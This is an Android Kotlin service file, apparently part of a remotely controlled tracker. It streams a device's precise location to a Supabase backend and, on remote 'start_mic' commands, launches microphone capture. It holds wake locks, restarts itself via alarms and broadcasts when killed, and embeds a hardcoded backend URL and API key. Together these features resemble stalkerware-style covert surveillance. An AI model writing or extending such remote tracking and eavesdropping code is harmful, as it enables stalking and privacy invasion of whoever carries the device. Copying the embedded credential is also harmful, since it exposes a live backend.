package com.example.livelocationservice

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.postgrest
import io.github.jan.supabase.realtime.Realtime
import io.github.jan.supabase.realtime.PostgresAction
import io.github.jan.supabase.realtime.channel
import io.github.jan.supabase.realtime.postgresChangeFlow
import io.github.jan.supabase.realtime.realtime
import io.github.jan.supabase.realtime.RealtimeChannel
import io.github.jan.supabase.realtime.broadcastFlow
import io.github.jan.supabase.realtime.broadcast
import io.github.jan.supabase.postgrest.query.Order
import io.github.jan.supabase.postgrest.query.filter.FilterOperator
import kotlinx.coroutines.*
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.jsonPrimitive
import java.net.URLEncoder
import java.nio.charset.StandardCharsets

/**
 * Per-device command row from the live `commands` table. The tracker
 * only reads `device_id`/`command`. Extra columns (`params`, `status`)
 * are tolerated by Kotlin serialization.
 */
@Serializable
data class TrackerCommand(
    val id: Long = 0,
    val device_id: String,
    val command: String,   // "wake" | "sleep" | "start_mic" | "stop_mic"
    val params: String? = null,
    val status: String? = null,
)

@Serializable
data class LocationData(
    val device_id: String,
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float,
    val bearing: Float,
    val created_at: String,
)

class LiveLocationService : Service() {
    private val TAG = "LiveLocationService"
    private var wakeLock: PowerManager.WakeLock? = null
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private lateinit var commandsChannel: RealtimeChannel
    private lateinit var locationsChannel: RealtimeChannel
    private val exceptionHandler = CoroutineExceptionHandler { _, exception ->
        Log.e(TAG, "Unhandled Coroutine Exception: ${exception.message}", exception)
    }
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob() + exceptionHandler)

    private val supabaseUrl = "https://jyiqhqxjoahlxflaated.supabase.co"
    private val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp5aXFocXhqb2FobHhmbGFhdGVkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU0MzIwMjksImV4cCI6MjEwMTAwODAyOX0.Fel6E89P2A-RIhoHv3LYra1ycPxPZG8nYiet8IhDRzg"

    private lateinit var supabase: SupabaseClient
    private var isAwake = false
    private var lastSentLocation: Location? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service Created")
        startAsForegroundService()

        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "LiveLocationService::WakeLock")

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { location ->
                    sendLocationToSupabase(location)
                }
            }
        }

        initSupabase()
    }

    private fun initSupabase() {
        try {
            supabase = createSupabaseClient(supabaseUrl, supabaseKey) {
                install(Postgrest)
                install(Realtime) {
                    reconnectDelay = kotlin.time.Duration.parse("2s")
                    heartbeatInterval = kotlin.time.Duration.parse("15s")
                }
            }

            serviceScope.launch {
                try {
                    dispatchInitial()
                    supabase.realtime.connect()
                    listenForCommands()
                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    Log.e(TAG, "Supabase connection error: ${e.message}")
                }
            }
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Supabase init error: ${e.message}")
        }
    }

    /**
     * Ponytail: replaced three reads (app_signals, mic_commands-dispatching-on-top)
     * with a single dispatch that replays the latest command for this device.
     *
     * Semantics: `start_mic` implies `wake` so a service restart after a
     * `wake → start_mic` sequence keeps BOTH the mic and the location stream
     * active. `stop_mic` is a no-op for location; `sleep` is a no-op for mic.
     */
    private suspend fun dispatchInitial() {
        try {
            val deviceId = deviceName()
            val encoded = encodeFilterValue(deviceId)
            val rows = supabase.postgrest["commands"]
                .select {
                    filter { eq("device_id", deviceId) }
                    order("created_at", Order.DESCENDING)
                    limit(1)
                }.decodeList<TrackerCommand>()
            val latest = rows.firstOrNull()?.command
            Log.d(TAG, "Initial command state: $latest")
            withContext(Dispatchers.Main) { applyCommand(latest) }
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "dispatchInitial failed: ${e.message}")
        }
        // Heartbeat: send one immediate last-known location so the
        // controller's map isn't blank after a service restart.
        // Setup locations channel for broadcast
        val locTopic = "public:locations"
        supabase.realtime.subscriptions.values.find { it.topic == locTopic }?.let {
            supabase.realtime.removeChannel(it)
        }
        locationsChannel = supabase.channel(locTopic)
        locationsChannel.subscribe(blockUntilSubscribed = true)
        
        withContext(Dispatchers.Main) {
            if (ContextCompat.checkSelfPermission(this@LiveLocationService, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                    if (location != null) {
                        Log.d(TAG, "Sending forced initial heartbeat")
                        serviceScope.launch { sendLocationToSupabase(location) }
                    }
                }
            }
        }
    }

    /**
     * Single channel subscribes to `commands` filtered by `device_id`.
     * Previously this app subscribed to two channels (`app_signals` and
     * `mic_commands`) — neither exists on the live project.
     */
    private suspend fun CoroutineScope.listenForCommands() {
        val deviceId = deviceName()
        while (isActive) {
            try {
                val topic = "public:commands"
                val existing = supabase.realtime.subscriptions.values.find { it.topic == topic }
                if (existing != null) {
                    supabase.realtime.removeChannel(existing)
                }
                commandsChannel = supabase.channel(topic)
                val broadcastFlow = commandsChannel.broadcastFlow<TrackerCommand>(event = "command")
                commandsChannel.subscribe(blockUntilSubscribed = true)
                broadcastFlow.collect { cmd ->
                    if (cmd.device_id == deviceId) {
                        Log.d(TAG, "Command received via broadcast: ${cmd.command}")
                        withContext(Dispatchers.Main) { applyCommand(cmd.command) }
                    }
                }
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                Log.e(TAG, "listenForCommands error, retry in 5s: ${e.message}")
                delay(5000)
            }
        }
    }

    private fun applyCommand(cmd: String?) {
        when (cmd) {
            "ping" -> {
                sendPongBroadcast()
                forceHeartbeat()
            }
            "wake" -> startLocationUpdates()
            "sleep" -> stopLocationUpdates()
            "start_mic" -> {
                // Implicitly wake so start_mic works without a prior wake.
                startLocationUpdates()
                val intent = Intent(this, MicStartActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                }
                startActivity(intent)
            }
            "stop_mic" -> stopService(Intent(this, AudioUplinkService::class.java))
            // Null (no row) → default to wake, matching the original
            // behaviour for app_signals().
        }
    }

    private fun sendPongBroadcast() {
        serviceScope.launch {
            try {
                if (::commandsChannel.isInitialized) {
                    commandsChannel.broadcast(
                        event = "pong",
                        message = TrackerCommand(
                            device_id = deviceName(),
                            command = "pong"
                        )
                    )
                    Log.d(TAG, "Pong broadcasted instantly")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to broadcast pong: ${e.message}")
            }
        }
    }

    private fun startLocationUpdates() {
        if (isAwake) return

        val hasPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasPermission) {
            Log.e(TAG, "Location permission missing, cannot start updates")
            return
        }

        isAwake = true
        Log.d(TAG, "Starting location updates")

        if (wakeLock?.isHeld == false) {
            wakeLock?.acquire()
        }

        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 0)
            .setMinUpdateIntervalMillis(0)
            .setMaxUpdateDelayMillis(0)
            .setMinUpdateDistanceMeters(0f)
            .build()

        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            )

            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                if (location != null) {
                    Log.d(TAG, "Sending immediate heartbeat with last known location")
                    sendLocationToSupabase(location)
                } else {
                    Log.d(TAG, "No last known location available for immediate heartbeat")
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission missing: ${e.message}")
            stopLocationUpdates()
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request location updates: ${e.message}")
            stopLocationUpdates()
        }
    }

    private fun stopLocationUpdates() {
        if (!isAwake) return
        isAwake = false
        Log.d(TAG, "Stopping location updates")
        fusedLocationClient.removeLocationUpdates(locationCallback)
        releaseWakeLock()
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release wakelock: ${e.message}")
        }
    }

    private fun sendLocationToSupabase(location: Location, force: Boolean = false) {
        if (!force && lastSentLocation != null && lastSentLocation!!.latitude == location.latitude && lastSentLocation!!.longitude == location.longitude) {
            return // Skip sending the exact same location twice
        }
        lastSentLocation = location

        serviceScope.launch {
            try {
                val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US)
                sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")

                val data = LocationData(
                    device_id = deviceName(),
                    latitude = location.latitude,
                    longitude = location.longitude,
                    accuracy = location.accuracy,
                    bearing = location.bearing,
                    created_at = sdf.format(java.util.Date())
                )
                
                // Broadcast for real-time low latency
                if (::locationsChannel.isInitialized) {
                    locationsChannel.broadcast(event = "location", message = data)
                }

                // Insert for history (asynchronous, doesn't block broadcast)
                supabase.postgrest["locations"].insert(data)
                
                Log.d(TAG, "Location broadcasted & inserted: ${data.latitude}, ${data.longitude}")
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send location: ${e.message}")
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service Started")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun scheduleRestartAlarm() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, BootReceiver::class.java).apply {
            action = "android.intent.action.MY_PACKAGE_REPLACED"
        }
        val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && alarmManager.canScheduleExactAlarms()) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 10000, pendingIntent)
        } else {
            alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 10000, pendingIntent)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopLocationUpdates()
        releaseWakeLock()
        Log.d(TAG, "Service Destroyed")
        scheduleRestartAlarm()
        // Broadcast to restart the service if killed
        val restartIntent = Intent(applicationContext, BootReceiver::class.java)
        restartIntent.action = "android.intent.action.MY_PACKAGE_REPLACED"
        sendBroadcast(restartIntent)
        serviceScope.cancel()
    }

    private fun startAsForegroundService() {
        val NOTIFICATION_ID = 12345
        val CHANNEL_ID = "silent_location_channel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Location Monitoring Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                description = "Required for 24/7 background location updates"
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Location Service Running")
            .setContentText("Monitoring for commands…")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun forceHeartbeat() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                if (location != null) {
                    sendLocationToSupabase(location, force = true)
                } else if (lastSentLocation != null) {
                    sendLocationToSupabase(lastSentLocation!!, force = true)
                } else {
                    Log.d(TAG, "forceHeartbeat: No location available")
                }
            }
        } else if (lastSentLocation != null) {
            sendLocationToSupabase(lastSentLocation!!, force = true)
        }
    }

    companion object {
        /**
         * Ponytail: `Build.MANUFACTURER + " " + Build.MODEL` is reused
         * four places. Centralized so the unique identifier semantics live
         * in one spot if a future change swaps to a UUID.
         */
        fun deviceName(): String {
            val manufacturer = Build.MANUFACTURER.replaceFirstChar {
                if (it.isLowerCase()) it.titlecase(java.util.Locale.US) else it.toString()
            }
            return "$manufacturer ${Build.MODEL}"
        }

        /**
         * Android's `URLEncoder` produces `application/x-www-form-urlencoded`
         * (RFC 1738) — spaces become `+`. PostgREST's Realtime filter
         * decoder follows RFC 3986 — spaces are `%20`. Without the
         * replace, `device_id = 'Samsung SM-S908B'` never matches and
         * the realtime subscription silently no-ops.
         */
        fun encodeFilterValue(raw: String): String =
            URLEncoder.encode(raw, StandardCharsets.UTF_8.name()).replace("+", "%20")
    }
}
